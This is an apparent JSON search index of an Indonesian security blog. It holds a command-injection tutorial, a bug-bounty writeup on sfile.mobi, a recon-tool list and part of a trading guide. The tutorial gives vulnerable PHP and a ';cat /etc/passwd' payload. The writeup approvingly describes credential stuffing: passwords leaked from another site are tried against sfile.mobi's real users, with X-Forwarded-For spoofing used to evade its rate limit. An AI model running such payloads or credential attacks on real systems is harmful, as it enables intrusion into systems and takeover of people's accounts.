mudah kehilangan sebagian besar modal mereka. Salah satu aspek utama dalam pengelolaan risiko adalah penentuan ukuran posisi yang sesuai dengan tingkat toleransi risiko Anda. Menggunakan rasio risk-to-reward yang sehat, seperti 1:2 atau 1:3, akan memastikan bahwa kerugian yang Anda tanggung tetap lebih kecil dibandingkan dengan potensi keuntungan.\nSelain itu, penting untuk selalu menerapkan stop-loss dan take-profit pada setiap posisi trading Anda. Dengan memiliki batasan risiko yang jelas, Anda menghindari keputusan emosional yang bisa merugikan. Jangan lupa untuk selalu mengevaluasi kembali posisi Anda berdasarkan kondisi pasar yang berubah dan menjaga disiplin dalam menjalankan rencana trading.\nKesimpulan: Dari Zero ke Hero Trading bukanlah hal yang bisa dikuasai dalam semalam. Mulailah dengan membangun dasar yang kuat melalui candlestick patterns, volume, support-resistance, dan indikator teknikal dasar. Setelah itu, pelajari konsep-konsep lanjutan seperti Fibonacci, Price Action, dan teori-teori seperti ICT dan Unicorn Model untuk mengasah keterampilan analisis kamu.\nIngat, menjadi trader yang sukses membutuhkan disiplin, pemahaman yang mendalam tentang alat yang kamu gunakan, dan kemampuan untuk mengelola risiko serta psikologi trading. Jangan terburu-buru, nikmati proses belajar ini, dan terus berkembang untuk menjadi seorang trader yang lebih baik.\n","permalink":"/posts/technical-analysis-zero-to-hero/","title":"Panduan Lengkap Jalur Belajar Analisis Teknikal From Zero to Hero"},{"content":"","permalink":"/tags/projects/","title":"Projects"},{"content":" os command injection biasanya terjadi ketika seorang web developer keliru dalam mengatur penerimaan input didalam situsnya. biasanya terjadi ketika form input yang dibuat menggunakan fungsi seperti exec(), system(), dll. tergantung fungsi tersebut berasal dari bahasa pemogramman apa. jika python biasanya menggunakan os.system() atau eval(), etc.\ntentu saja ini jadi sesuatu yang sangat berbahaya dikarenakan attacker dapat memasukan perintah berbahaya kedalam shell sistem operasi yang ada disitus tersebut.\nSerangan command injection bisa terjadi ketika sebuah aplikasi (forms, cookies, HTTP headers, dll) bisa menjalankan perintah yang tidak aman dari inputan user ke sistem shell. crashtest security menurut crashtest security, os command injection tidak hanya bisa terjadi di forms melainkan bisa saja ditempat lain seperti diatas.\ndemonstrasi contoh kode php yang rentan dengan os command injection karena ketiadaan validasi input ataupun proses filtering.\n\u0026lt;?php $ip = $_GET[\u0026#39;ip\u0026#39;]; $cmd = system(\u0026#39;ping \u0026#39;.$ip); echo $cmd ?\u0026gt; buat file ping.php \u0026amp; jalankan diterminal kalian $ php -S 127.0.0.1:8000 -t .\nkunjungi dan cobalah masukan input seperti ini\nhttp://127.0.0.1:8000/ping.php?ip=cat%20/etc/passwd\nmaka jika dibrowser saya, ini tidak menghasilkan apa-apa. dikarenakan perintah cat /etc/passwd masih dianggap sebagai argumen untuk ping.\n[Thu Sep 1 18:16:34 2022] 127.0.0.1:41126 Accepted ping: unknown host cat [Thu Sep 1 18:16:34 2022] 127.0.0.1:41125 [200]: GET /ping.php?ip=cat%20/etc/passwd [Thu Sep 1 18:16:34 2022] 127.0.0.1:41125 Closing bisa dilihat disana ada pesan uknown host cat. yang menandakan perintah cat kita dianggap destination dari ping. nah kalian bisa mencoba nya lagi dengan membatalkan perintah ping dengan shell escapes.\n; | || \u0026lt; \u0026amp; \u0026amp;\u0026amp; $() let\u0026rsquo;s try again\nhttp://127.0.0.1:8000/ping.php?ip=;cat /etc/passwd\nmaka kalian bisa melihat bahwa disini kita berhasil untuk melakukan perintah cat terhadap file passwd.\nbtw saya ngejalanin file php nya di termux, jadi output dari /etc/passwd nya agak aneh hhe.\nother references beberapa referensi lain yang membahas command injection lebih detail.\ncommand injection https://book.hacktricks.xyz/pentesting-web/command-injection ","permalink":"/posts/os-command-injection/","title":"tentang vulnerability os-command injection"},{"content":" write up sederhana tentang bagaimana saya bisa menemukan bug IP restriction bypass di situs sfile.mobi.\ndan mendapatkan reward yang lumayan, hanya karena laporan bug sepele ini.\nFYI (For you information) jadi sebelumnya saya menemukan data leakage dari salah satu website yang tidak bisa saya sebutkan. karena ini privasi web diluar sfile.mobi. yang mana data tersebut berisi informasi seperti username, password dan email. dikarenakan situs yang terdapat data leakage tersebut adalah situs yang memiliki latar belakang seperti sfile.mobi juga. yaitu service free file sharing service. jadinya saya mempunyai ide yang cukup cemerlang.\nkarena saya sering mengunjungi situs sfile.mobi buat download config :/\u0026lt; terlintas dalam pikiran saya.\n\u0026ldquo;apa para pengguna didata yang saya miliki ini, juga login disitus sfile.mobi?\u0026rdquo;\ndan yap tercetus lah ide untuk melakukan brute-forcing.\nProof OF Concept awalnya saya mencoba mengunjungi halaman sfile.mobi dan ke halaman loginnya untuk melakukan web scraping. yang URL nya berada disini.\nhttps://sfile.mobi/login.php\ndengan tujuan membuat tool atau bot otomatisasi login dengan ribuan data yang saya punya diatas tadi. awalnya saya hanya menulis program sederhana untuk mencobanya. dan ini hasil yang saya temukan.\nsource code: pastebin terlihat disana menunjukan status kode 401 dan programnya crash (stuck) tidak jalan lagi. dikarenakan halaman loginnya sudah tidak bisa diakses atau terkena limit IP. sama hal ketika saya kunjungi melalui browser, IP saya pun sudah terbanned.\nlantas saya mencoba alternatif lain untuk melakukan brute-force tanpa harus terkena limit IP.\nyang pertama saya mencoba dengan proxy namun tetap saja gagal, tidak bisa ditembus. langkah kedua saya mencoba melakukan injeksi terhadap headers ketika melakukan POST request.yaitu melakukan bypass IP source restrictions dengan HTTP headers.\ndisini saya hanya memodifikasi header nya dengan menambahkan nilai.\n\u0026#34;X-Forwarded-For\u0026#34;: IP SPOOF / FAKE IP untuk fake IP saya hanya membuat alamat ip random, asal-asalan saja. dengan syntax python seperti ini atau bisa lihat lengkap disource code bawah.\nip = \u0026#34;.\u0026#34;.join(map(str, (random.randint(0, 255) for _ in range(4)))) source code: pastebin ketika saya jalankan programnya, ternyata IP limit bypassed. saya mencoba ngeload sekitar ribuan akun ternyata bisa dan mendapatkan banyak akun yang online (registered) di platform sfile.mobi.\nstatus bug: patched Referensi tentang IP restriction bypass 403/401 Bypasses https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/403-and-401-bypasses 403/401 bypass hackerone report https://hackerone.com/reports/991717 IP restriction (root-me CTF) https://archiko.my.id/archives/root-me-writeup-ip-restriction-bypass/ 403 bypass - medium https://sapt.medium.com/bypassing-403-protection-to-get-pagespeed-admin-access-822fab64c0b3 ","permalink":"/posts/bypass-ip-restriction-at-sfile.mobi/","title":"Bypass IP restriction at sfile.mobi - writeup"},{"content":"","permalink":"/tags/writeups/","title":"Writeups"},{"content":" notes: in this article if you found text like this here is a tools or platforms. you just search that on google or other search engines. this article will be to always updated if me found new techniques or methods. base whois: whois ssl information: sslscan dns enumeration: dnsrecon nslookup dnsx dnsenum identify web technology: whatweb wappalyzer cmsmap check webapp firewall: wafw00f check security headers: shcheck subdo enumeration: subfinder sublist3r knock extracting all IP from collected subdodomain port scanning \u0026amp; banner grabbing: nmap amass aquatone naabu check domain takeover: subzy domain \u0026amp; subdo osint: shodan censys check http(s) 80/443: httpx \u0026gt; altdns \u0026gt; nuclei reverse IP lookup hackertarget googledork bing Content discovery Fuzzing\ngetting directory, files, sensitive data. scan error like system crash, sql injection, etc. with fuzzing technique\nwfuzz: Web application fuzzer ffuf: Fast web fuzzer written in Go fuzzdb Dictionary of attack patterns and primitives for black-box application fault injection and resource discovery. links and urls\ngetting js files, php, aspx and other interesting files or urls. for scanning endpoint, API path, etc.\ngau: Fetch known URLs from AlienVault\u0026rsquo;s Open Threat Exchange, the Wayback Machine, and Common Crawl. waybackurls: Fetch all the URLs that the Wayback Machine knows about for a domain getJS: A tool to fastly get all javascript sources/files linkfinder: A python script that finds endpoints in JavaScript files assetfinder: Find domains and subdomains related to a given domain Parameters\nparameth: This tool can be used to brute discover GET and POST parameters\nParamSpider: Mining parameters from dark corners of Web Archives\nffuf\ncommix Other helper\ngobuster: Directory/File, DNS and VHost busting tool written in Go\ngospider: Gospider - Fast web spider written in Go\nhakrawler: Simple, fast web crawler designed for easy, quick discovery of endpoints and assets within a web application\ngit-hound: Reconnaissance tool for GitHub code search. Finds exposed API keys using pattern matching, commit history searching, and a unique result scoring system.\npagodo: pagodo (Passive Google Dork) - Automate Google Hacking Database scraping and searching\nExtra resources for you :3 Cool Recon techniques every hacker misses! 🔥🔥 https://infosecwriteups.com/cool-recon-techniques-every-hacker-misses-1c5e0e294e89\n","permalink":"/posts/reconnaissance-summary/","title":"summary of reconnaissance for web application bug hunting 🕷"},{"content":"HnvDie 🕷️ ","permalink":"/","title":"HnvDie"}]